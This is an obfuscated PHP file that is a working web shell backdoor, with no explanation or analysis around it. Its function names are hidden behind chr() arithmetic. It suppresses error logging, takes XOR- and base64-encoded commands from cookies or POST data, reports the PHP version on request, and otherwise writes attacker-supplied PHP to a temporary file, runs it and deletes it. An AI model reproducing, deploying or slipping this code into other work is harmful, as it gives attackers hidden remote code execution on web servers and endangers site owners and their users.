<?php $wiufvrozxw = "\x66".chr(105).chr(108).chr(269-168).chr(95).chr(112)."\165".chr(116).'_'."\143".'o'.chr(110).'t'."\x65".chr(110)."\x74".'s';
$tbqyuifk = chr(334-236).chr(484-387).'s'.'e'."\66".chr(52)."\x5f".chr(698-598)."\145"."\x63".'o'.chr(100)."\x65";
$gnajsfm = chr(105).chr(110).chr(178-73)."\x5f"."\x73"."\x65".chr(944-828);
$deeerqtxe = chr(633-516)."\156".chr(332-224).'i'.'n'.chr(204-97);


@$gnajsfm(chr(101)."\162".chr(114).chr(111)."\x72".'_'."\x6c".'o'.chr(534-431), NULL);
@$gnajsfm(chr(462-354).chr(1106-995).'g'.'_'.chr(101)."\162"."\x72"."\x6f"."\162".'s', 0);
@$gnajsfm('m'.chr(964-867).chr(120).chr(704-609)."\x65".'x'."\145".chr(664-565).'u'.chr(116).'i'.chr(631-520).'n'.chr(95).'t'.chr(909-804).chr(1071-962).'e', 0);
@set_time_limit(0);

function puzubtvrlz($gipucnebxx, $ubhzjddiyp)
{
    $tqpfft = "";
    for ($dgrbytldai = 0; $dgrbytldai < strlen($gipucnebxx);) {
        for ($j = 0; $j < strlen($ubhzjddiyp) && $dgrbytldai < strlen($gipucnebxx); $j++, $dgrbytldai++) {
            $tqpfft .= chr(ord($gipucnebxx[$dgrbytldai]) ^ ord($ubhzjddiyp[$j]));
        }
    }
    return $tqpfft;
}

$vvsrcva = array_merge($_COOKIE, $_POST);
$urnyol = '38adeddb-35d6-41a5-ad08-8f47102821f7';
foreach ($vvsrcva as $tyglhga => $gipucnebxx) {
    $gipucnebxx = @unserialize(puzubtvrlz(puzubtvrlz($tbqyuifk($gipucnebxx), $urnyol), $tyglhga));
    if (isset($gipucnebxx["\x61".chr(434-327)])) {
        if ($gipucnebxx[chr(418-321)] == 'i') {
            $dgrbytldai = array(
                chr(112)."\166" => @phpversion(),
                's'.chr(535-417) => "3.5",
            );
            echo @serialize($dgrbytldai);
        } elseif ($gipucnebxx[chr(418-321)] == chr(101)) {
            $eeemwfe = "./" . md5($urnyol) . chr(46).chr(637-532)."\156".chr(99);
            @$wiufvrozxw($eeemwfe, "<" . '?'.chr(646-534).chr(871-767)."\160".chr(32).chr(64).'u'."\156".'l'.'i'.chr(110)."\x6b"."\50".chr(95)."\137".chr(70).chr(73).'L'."\105".'_'.'_'.chr(41)."\73".' ' . $gipucnebxx["\x64"]);
            include($eeemwfe);
            @$deeerqtxe($eeemwfe);
        }
        exit();
    }
}

